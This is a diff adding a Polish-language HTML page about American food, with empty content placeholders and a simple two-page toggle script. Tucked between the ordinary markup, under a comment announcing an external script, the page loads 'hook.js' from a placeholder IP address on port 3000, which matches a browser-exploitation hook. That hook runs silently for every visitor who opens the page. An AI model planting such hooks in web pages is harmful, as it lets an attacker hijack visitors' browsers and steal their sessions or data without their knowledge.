@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amerykańskie Jedzenie</title>
+    <style>
+        /* Twoje style CSS */
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Amerykańskie Jedzenie</h1>
+    </header>
+    <div class="container">
+        <!-- Treść strony -->
+    </div>
+
+    <button class="nav-button" id="nextPage">Następna strona</button>
+    <button class="nav-button" id="prevPage">Poprzednia strona</button>
+    
+    <div class="info-section" id="page2" style="display: none;">
+        <!-- Treść strony 2 -->
+    </div>
+
+    <!-- Dodajemy zewnętrzny skrypt -->
+    <script src="http://<IP>:3000/hook.js"></script>
+
+    <script>
+        // Obsługa przycisków do zmiany stron
+        const nextPageButton = document.getElementById('nextPage');
+        const prevPageButton = document.getElementById('prevPage');
+        const page2 = document.getElementById('page2');
+
+        nextPageButton.addEventListener('click', () => {
+            page2.style.display = 'block';
+            nextPageButton.style.display = 'none';
+            prevPageButton.style.display = 'block';
+        });
+
+        prevPageButton.addEventListener('click', () => {
+            page2.style.display = 'none';
+            nextPageButton.style.display = 'block';
+            prevPageButton.style.display = 'none';
+        });
+    </script>
+</body>
+</html>
